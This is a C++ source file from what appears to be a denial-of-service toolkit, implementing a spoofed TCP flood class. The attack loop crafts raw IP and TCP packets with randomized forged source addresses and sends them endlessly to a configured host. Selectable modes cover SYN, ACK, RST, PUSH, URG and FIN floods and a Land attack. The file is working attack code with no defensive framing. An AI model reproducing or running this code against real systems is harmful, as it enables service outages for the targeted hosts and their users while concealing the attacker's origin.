#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "../Headers/Randomizer.hpp"
#include "../Headers/Spoofed_TCP_Flood.hpp"
#include "../Headers/Logging.hpp"

void Spoofed_TCP_Flood::attack() {
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    char buf[8192], *pseudogram;
    struct pseudo_header psh{};
    auto *ip = (struct iphdr *) buf;
    auto *tcp = (struct tcphdr *) (buf + sizeof (struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    while (true){
        for(int x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_TCP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    print_error("Can't resolve the host");
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if(conf->RandomizeSource){
                std::string ipaddr{};
                Randomizer::randomIP(ipaddr);
                if((ip->saddr = inet_addr(ipaddr.c_str())) == -1){
                    continue;
                }
            }else{
                ip->saddr = 0;
            }

            init_headers(ip, tcp, buf);
            override_headers(tcp, ip);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            psh.source_address = ip->saddr;
            psh.dest_address = ip->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.length = htons(sizeof(struct tcphdr) + strlen(buf));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
            pseudogram = (char *) ::operator new(static_cast<size_t>(psize));

            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));

            tcp->th_sum = csum( (unsigned short*) pseudogram , psize);


            if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, reinterpret_cast<sockaddr*>(&dst), sizeof(struct sockaddr_in)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_TCP);
            }else{
                (*conf->req)++;
            }
            delete pseudogram;
        }
        (*conf->voly)++;
        pause();
    }
}

Spoofed_TCP_Flood::Spoofed_TCP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(conf)) {

}

void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
    switch (conf->vector){
        case Config::SpoofedSyn:
            tcp->th_flags = TH_SYN;
            break;
        case Config::SpoofedAck:
            tcp->th_flags = TH_ACK;
            break;
        case Config::SpoofedRST:
            tcp->th_flags = TH_RST;
            break;
        case Config::SpoofedPUSH:
            tcp->th_flags = TH_PUSH;
            break;
        case Config::SpoofedURG:
            tcp->th_flags = TH_URG;
            break;
        case Config::SpoofedFin:
            tcp->th_flags = TH_FIN;
            break;
        case Config::Land:
            tcp->th_flags = TH_SYN;
            ip->saddr = ip->daddr;
            tcp->th_sport = tcp->th_dport;
        default:break;
    }
}

void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
    auto s_port = conf->RandomizePort ? Randomizer::randomPort() : 0;
    // IP Struct
    ip->ihl = sizeof(struct iphdr)/4;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = csum((unsigned short *) buf, ip->tot_len);

    // TCP Struct
    tcp->th_sport = htons(static_cast<uint16_t>(s_port));
    tcp->th_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
    tcp->th_seq = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
    tcp->th_ack = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
    tcp->th_off = sizeof(struct tcphdr)/4;
    tcp->th_win = htons(5840);
}
